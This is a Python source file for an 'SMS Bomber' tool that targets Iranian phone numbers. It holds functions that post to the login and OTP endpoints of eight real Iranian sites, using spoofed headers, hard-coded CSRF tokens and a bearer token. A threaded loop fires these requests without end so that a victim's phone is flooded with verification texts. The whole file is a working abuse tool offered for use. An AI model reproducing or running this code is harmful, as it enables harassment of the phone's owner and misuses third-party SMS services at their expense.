from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3
from time import sleep
import random
import socket

# ------------------------------
# Imports & Setup
# ------------------------------
urllib3.disable_warnings()

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
b = '\033[34;1m'
p = '\033[35;1m'
w = '\033[37;1m'
a = '\033[0m'
d = '\033[90;1m'

# System info
Node, System, Release = node(), system(), release()

# ------------------------------
# Helpers
# ------------------------------
def clear_screen():
    os_system('clear' if name == 'posix' else 'cls')

def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS Service
# ------------------------------


def mo7_ir(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mo7.ir/bakala/ajax/send_code/"
    
    payload = {
        "action": "bakala_send_code",
        "phone_email": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-CSRF-TOKEN": "b5ea5c0516",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://mo7.ir",
        "Referer": "https://mo7.ir/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mo7_ir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mo7_ir) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mo7_ir Exception: {e}{a}')
        return False
        

def dgshahr(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://lend-b.dgshahr.com/user/login/"
    
    payload = {
        "phone_number": formatted_phone,
        "source": "google-organic",
        "campaign": "undefined"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://lend-b.dgshahr.com",
        "Referer": "https://lend-b.dgshahr.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(dgshahr) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (dgshahr) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] dgshahr Exception: {e}{a}')
        return False



def torobpay(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.torobpay.com/user/v1/login/?source=mobile&http_referrer=https%3A%2F%2Fwww.google.com%2F"
    
    payload = {
        "phone_number": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-CSRFTOKEN": "",
        "Origin": "https://torobpay.com",
        "Referer": "https://torobpay.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(torobpay) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (torobpay) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] torobpay Exception: {e}{a}')
        return False

def malltina(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.malltina.com/profiles"
    
    payload = {
        "password": "mM12345678",
        "mobile": formatted_phone,
        "sign_up_referral_link": "https://www.google.com/"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.malltina.com",
        "Referer": "https://www.malltina.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(malltina) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (malltina) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] malltina Exception: {e}{a}')
        return False


def missomister(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://www.missomister.com/", timeout=10)
        
        # استخراج CSRF_TOKEN
        csrf_token = None
        csrf_patterns = [
            r'name="csrf" value="([a-f0-9]+)"',
            r'name="dig_nounce" value="([a-f0-9]+)"'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            csrf_token = "7bc87785e8"
        
        url = "https://www.missomister.com/wp-admin/admin-ajax.php"
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": csrf_token,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.missomister.com",
            "Referer": "https://www.missomister.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            if response.text.strip() == "1":
                print(f'{g}(missomister) {a}Code Sent')
                return True
        
        print(f'{r}[-] (missomister) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (missomister) Failed{a}')
        return False


def candom_shop(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://candom.shop/bakala/ajax/send_code/"
    
    payload = {
        "action": "bakala_send_code",
        "phone_email": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-CSRF-TOKEN": "7aae5b22e1",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://candom.shop",
        "Referer": "https://candom.shop/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(candom_shop) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (candom_shop) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] candom_shop Exception: {e}{a}')
        return False
        

def tapsi_food(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.tapsi.food/v1/api/Authentication/otp"
    
    payload = {
        "cellPhone": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWVzdElkIjoiZTc4ZjIwMzgtZjgzNi00MDA2LThjYzItYTYzY2YzMmI2OWY5IiwiVHlwZSI6Ikd1ZXN0IiwiRXhwaXJlSW4iOiIxMDgwMDAwMCIsIm5iZiI6MTc1NjI0Mzc1OCwiZXhwIjoxNzU2MjU0NTU4LCJpYXQiOjE3NTYyNDM3NTgsImlzcyI6Imh0dHBzOi8vbG9jYWxob3N0OjUwMDEiLCJhdWQiOiJodHRwczovL2xvY2FsaG9zdDo1MDAxIn0.FJnYvqwBa9za2y0SGANgFg_3PGNLeZkeCDPebJS0YTE",
        "x-platform": "mobile",
        "x-app-version": "v1.5.12-prd",
        "Origin": "https://tapsi.food",
        "Referer": "https://tapsi.food/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(tapsi_food) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (tapsi_food) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] tapsi_food Exception: {e}{a}')
        return False


def banimode(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mobapi.banimode.com/api/v2/auth/request"
    
    payload = {
        "phone": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.banimode.com",
        "Referer": "https://www.banimode.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(banimode) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (banimode) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] banimode Exception: {e}{a}')
        return False




# ------------------------------
# Service Runner
# ------------------------------
def send_service_safe(service, phone):
    """Run SMS service safely with error handling"""
    try:
        result = service(phone)
        if result:
            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
        else:
            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
    except Exception as e:
        print(f"{r}[!] Error in {service.__name__}: {e}{a}")

# ------------------------------
# SMS Bomber
# ------------------------------
def Vip(phone, Time):
    services = [
    banimode,
    tapsi_food, 
    candom_shop,
    missomister,
    torobpay,
    malltina,
    dgshahr,
    mo7_ir,  # جایگزین 1001kharid
]
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        clear_screen()

# ------------------------------
# Phone validation
# ------------------------------
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    clear_screen()
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# ------------------------------
# Main Loop
# ------------------------------
def main():
    while True:
        choice = main_menu()
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented yet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

# ------------------------------
# Entry Point
# ------------------------------
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection detected!{a}")
    else:
        main()
